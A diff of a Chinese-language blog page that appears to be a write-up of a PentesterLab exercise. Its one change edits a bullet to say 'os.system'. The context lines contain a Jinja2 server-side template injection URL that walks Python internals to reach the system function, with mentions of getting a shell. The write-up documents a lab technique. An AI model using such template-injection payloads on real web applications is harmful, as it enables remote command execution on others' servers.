@@ -405,7 +405,7 @@
 <p><img src="/2018/01/16/从一道pentesterlab的题目说起/shell.png" alt=""></p>
 <h4 id="method2"><a href="#method2" class="headerlink" title="method2"></a>method2</h4><ul>
 <li>今天又仔细研究了一下，发现了一种不依赖mro（Method Resolution Order）的方法。<br><img src="/2018/01/16/从一道pentesterlab的题目说起/indexsystem.png" alt=""></li>
-<li><p>一步一步找到system的索引为138</p>
+<li><p>一步一步找到os.system的索引为138</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;) &#125;&#125;</div></pre></td></tr></table></figure>
 </li>
 <li><p>同样可以拿到shell<br><img src="/2018/01/16/从一道pentesterlab的题目说起/shell2.png" alt=""></p>
